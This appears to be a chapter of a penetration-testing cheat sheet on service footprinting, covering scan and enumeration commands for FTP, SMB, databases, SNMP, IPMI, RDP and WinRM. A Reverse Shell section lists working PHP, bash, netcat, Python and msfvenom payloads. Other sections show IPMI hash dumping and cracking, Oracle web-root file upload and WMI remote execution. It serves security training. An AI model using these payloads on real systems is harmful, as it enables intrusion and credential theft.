# 🕵️ Footprinting

In this chapter of the Pwnomicon, we unveil rituals of passive and active reconnaissance — spells to trace the outlines of distant targets, enumerate domains whispered through DNS, and commune with services lurking in the void.

> *“Before breaching the gates, one must first map the dreamscape.”*

---

<details>
<summary><strong>🌐 Certificate Transparency + IP Resolution + Shodan</strong></summary>

Subdomain discovery via [crt.sh](https://crt.sh), followed by DNS resolution and Shodan fingerprinting.

```bash
# Initialize Shodan
shodan init <APIKEY>

# Extract subdomains from Certificate Transparency logs
curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq -r '.[].name_value' | \
awk '{gsub(/\\n/,"\n")}1' | sort -u | grep -v "CN=" > subdomainlist.txt

# Resolve IPs for discovered subdomains
for i in $(cat subdomainlist.txt); do 
  host "$i" | grep "has address" | grep "<DOMAIN>" | cut -d" " -f4 >> ip-addresses.txt
done

# Perform Shodan footprinting
for i in $(cat ip-addresses.txt | sort -u); do 
  shodan host "$i"
done
```

</details>

---

<details>
<summary><strong>📶 CIDR Discovery Script</strong></summary>

**Identify IP ranges and scan for live hosts using a custom script**

```bash
# This script automates the process of identifying the CIDR block for a given IP,
# pings all IPs in the range, and resolves IPs for a target domain.
# It supports argument validation and automation for efficient network mapping.
# See the script for details: ../scripts/CIDR.sh
```

### Key steps:
1. Validate input arguments
2. Identify CIDR block for a given IP
3. Ping all IPs in the range
4. Resolve IPs for a target domain
5. Support options and automation

**Script**: [`CIDR.sh`](../scripts/CIDR.sh)

</details>
 
---

<details>
<summary><strong>📦 FTP</strong></summary>

**Scan FTP service**

```bash
# Scans the target for FTP (port 21), detects service/version, runs default scripts, and enables aggressive scan options.
nmap -sV -p21 -sC -A <IP>
```

**Enumerate FTP settings and anonymously download files**

```bash
# Shows the FTP server configuration, excluding comments.
cat /etc/vsftpd.conf | grep -v "#"

# Lists users who are denied FTP access.
cat /etc/ftpusers

# Recursively downloads all files from the FTP server using the provided credentials.
wget -m --no-passive ftp://<USER>:<PASSWORD>@<IP>
```

**Service interaction**

```bash
# Connects to the FTP service using Netcat for manual interaction.
nc -nv <IP> <PORT>

# Connects to the FTP service using Telnet.
telnet <IP> <PORT>

# Initiates an SSL/TLS connection to the FTP service for encrypted communication.
openssl s_client -connect <IP>:<PORT> -starttls ftp
```

</details>

---

<details>
<summary><strong>📁 NFS</strong></summary>

**Scan NFS service**

```bash
# Scans for NFS-related ports and runs default scripts.
sudo nmap <IP> -p111,2049 -sV -sC

# Runs all NFS-related NSE scripts for deeper enumeration.
sudo nmap --script nfs* <IP> -sV -p111,2049
```

**Service interaction**

```bash
# Lists available NFS shares exported by the server.
showmount -e <IP>

# Mounts the NFS share locally for browsing.
mkdir target-NFS
sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock
cd target-NFS

# Shows directory structure.
tree .

# Lists contents with numeric user/group IDs.
ls -l -n mnt/nfs/

# Unmounts the NFS share.
sudo umount ./target-NFS
```

</details>
 
---

<details>
<summary><strong>🧩 SMB</strong></summary>

**Scan SMB service**

```bash
# Scans for SMB ports, detects service/version, and runs default scripts.
sudo nmap <IP> -sV -sC -p139,445
```

**Analyze shared folders and user access**

```bash
# Shows Samba configuration, excluding comments and semicolons.
cat /etc/samba/smb.conf | grep -v "#\|\;"

# Restarts the Samba service after making changes.
sudo systemctl restart smbd

# Lists available SMB shares without authentication.
smbclient -N -L //<IP>
```

### Tools:
- [`samrdump.py`](../scripts/samrdump.py): Dumps SAMR information from Windows hosts.
- [SMBMap](https://github.com/ShawnDEvans/smbmap): Enumerates SMB shares and permissions.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec): Swiss army knife for pentesting networks.
- [Enum4Linux-ng](https://github.com/cddmp/enum4linux-ng): Next-gen SMB enumeration tool.

```bash
# Install Enum4Linux-ng for advanced SMB enumeration.
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
sudo cp enum4linux-ng.py /usr/local/bin/enum4linux-ng
sudo chmod +x /usr/local/bin/enum4linux-ng
enum4linux-ng -h
```

</details>
 
---

<details>
<summary><strong>📧 SMTP</strong></summary>

**Scan SMTP service**

```bash
# Scans for SMTP on port 25, runs default scripts, and detects service/version.
sudo nmap <IP> -sC -sV -p25

# Checks if the SMTP server is an open relay.
sudo nmap <IP> -p25 --script smtp-open-relay -v
```

**Get configuration file**

```bash
# Displays the Postfix configuration file, excluding comments and empty lines.
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```

**Service interaction**

```bash
# Connects to the SMTP service for manual interaction and banner grabbing.
telnet <IP> <PORT>
```

</details>

---

<details>
<summary><strong>📨 IMAP POP3</strong></summary>

**Scan IMAP and POP3 services**

```bash
# Scans for IMAP and POP3 services, runs default scripts and capability checks.
sudo nmap <IP> -sV -p 110,143,993,995 -sC --script pop3-capabilities,imap-capabilities
```

**Service interaction**

```bash
# Connects to IMAPS using curl.
curl -k 'imaps://<IP>' --user <USER>:<PASSWORD>

# Connects to POP3S using OpenSSL.
openssl s_client -connect <IP>:pop3s

# Connects to IMAPS using OpenSSL.
openssl s_client -connect <IP>:imaps
```

</details>

---

<details>
<summary><strong>📡 SNMP</strong></summary>

**Footprinting SNMP service**

```bash
# Walks the SNMP tree using the provided community string.
snmpwalk -v2c -c <COMMUNITYSTRING> <IP>

# Scans for SNMP using a wordlist of community strings.
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
```

**Get configuration file**

```bash
# Displays the SNMP daemon configuration, excluding comments and empty lines.
cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
```

</details>

---

<details>
<summary><strong>🛢️ MySQL</strong></summary>

**Scan MySQL service**

```bash
# Scans for MySQL service, detects version, and runs MySQL NSE scripts.
sudo nmap <IP> -sV -sC -p3306 --script mysql*
```

**Get configuration file**

```bash
# Displays the MySQL server configuration, excluding comments and empty lines.
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```

**Service interaction**

```bash
# Connects to MySQL without a password.
mysql -u <USER> -h <IP>

# Connects to MySQL using a password.
mysql -u <USER> -p<PASSWORD> -h <IP>
```

</details>

---

<details>
<summary><strong>💾 MSSQL</strong></summary>

**Scan MSSQL service**

```bash
# Runs multiple Nmap scripts for MSSQL enumeration and checks for weak credentials.
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

**MSSQL Ping in Metasploit**

```bash
# Uses Metasploit to check if the MSSQL service is alive.
msf6 > use auxiliary/scanner/mssql/mssql_ping
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts <IP>
msf6 auxiliary(scanner/mssql/mssql_ping) > run
```

**Service interaction**

```bash
# Connects to MSSQL using the Impacket mssqlclient.py script.
python3 mssqlclient.py Administrator@<IP> -windows-auth
```

</details>

---

<details>
<summary><strong>🐚 Reverse Shell</strong></summary>

**PHP**
```php
# PHP reverse shell using bash over TCP.
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"); ?>
```

**BASH**
```bash
# Bash reverse shell over TCP.
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

# Bash reverse shell over UDP.
bash -i >& /dev/udp/<IP>/<PORT> 0>&1
```

**Netcat**
```bash
# Netcat reverse shell.
nc -e /bin/sh <IP> <PORT>
```

**Python**
```bash
# Python reverse shell using socket and subprocess.
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Metasploit**
```bash
# Generate various reverse shell payloads with msfvenom.
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

**Meterpreter**
```bash
# Generate Meterpreter reverse shell payloads with msfvenom.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

**Spawn TTY**
```bash
# Upgrade a shell to a fully interactive TTY.
python3 -c 'import pty; pty.spawn("/bin/bash"); import os; os.putenv("TERM", "xterm"); os.system("export SHELL=/bin/bash");'
export TERM=xterm
```

</details>

---

<details>
<summary><strong>🔐 SSH</strong></summary>

**Scan with SSH-Audit**
```bash
# Clones and runs SSH-Audit to enumerate SSH configuration and security.
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
./ssh-audit.py <IP>
```

**Get configuration file**
```bash
# Displays the SSH daemon configuration, excluding comments and empty lines.
cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'
```

**Service interaction**
```bash
# Connects to SSH using a username and password.
ssh <USER>@<ip>

# Connects to SSH using a private key.
ssh -i id_rsa <USER>@<ip>
```

**Port Forwarding**
```bash
# Forwards a local port to a remote host/port via SSH.
ssh -L <LPORT>:<RHOST>:<RPORT> <USER>@<IP>
```

</details>

---

<details>
<summary><strong>🧰 Oracle TNS</strong></summary>

**Scan TNS service**

```bash
# Scans for Oracle TNS service and attempts SID brute-forcing.
sudo nmap -p1521 -sV <IP> --open
sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute
```

**Oracle-Tools**

# See the setup script for installing Oracle tools.
[`Oracle-Tools-setup.sh`](../scripts/Oracle-Tools-setup.sh)

**Testing ODAT**

```bash
# Runs all ODAT modules against the Oracle server.
./odat.py all -s <IP>
```

**SQLplus Login**
```bash
# Connects to Oracle using SQLplus.
sqlplus <USER>/<PASS>@<IP>/XE
sqlplus <USER>/<PASS>@<IP>/XE as sysdba
```

**Fix SQLplus Library Path**
```bash
# Fixes library path issues for SQLplus.
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

**File Upload with Oracle**
```bash
# Uploads a file to the Oracle server using ODAT.
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s <IP> -d XE -U user -P password --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

**Download Uploaded File**
```bash
# Downloads the uploaded file via HTTP.
curl -X GET http://<IP>/testing.txt
```

</details>

---

<details>
<summary><strong>🖥️ IPMI</strong></summary>

**Scan with Nmap**
```bash
# Scans for IPMI version using Nmap UDP script.
sudo nmap -sU --script ipmi-version -p 623 <IP>
```

**Scan with Metasploit**
```bash
# Uses Metasploit to enumerate IPMI version.
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 > set rhosts <IP>
msf6 > show options
msf6 > run
```

**Dump Hashes**
```bash
# Dumps IPMI password hashes using Metasploit.
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 > set rhosts <IP>
msf6 > run
```

**Crack IPMI Hashes HP iLO using a factory default password**
```bash
# Cracks IPMI hashes using hashcat and a brute-force mask.
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

</details>

---

<details>
<summary><strong>➡️ RDP</strong></summary>

**Scan with Nmap**
```bash
# Scans for RDP service and runs RDP-related NSE scripts.
nmap -sV -sC -n <IP> -p3389 --disable-arp-ping --script rdp*
```

**RDP Security Check**

```bash
# Uses rdp-sec-check to enumerate RDP security settings.
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl <IP>
```

**Service interaction**
```bash
# Connects to RDP using xfreerdp.
xfreerdp /u:<USER> /p:"<PASSWORD>" /v:<IP>
```

</details>

---

<details>
<summary><strong>🔗 Windows Remote Management Protocols</strong></summary>

**WinRM**

**Scan with Nmap**
```bash
# Scans for WinRM service on ports 5985 and 5986.
nmap -sV -sC <IP> -p5985,5986 --disable-arp-ping -n
```

**Service interaction**
```bash
# Connects to WinRM using evil-winrm.
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
```

**Windows Management Instrumentation (WMI)**

**Footprinting the service**
```bash
# Executes a command on the remote host using WMI via Impacket.
usr/share/doc/python3-impacket/examples/wmiexec.py <USER>:"<PASSWORD>"@<IP> "hostname"
```

</details>

---

📘 **Next step:** Continue with [INFORMATION GATHERING](./02-information-gathering.md)
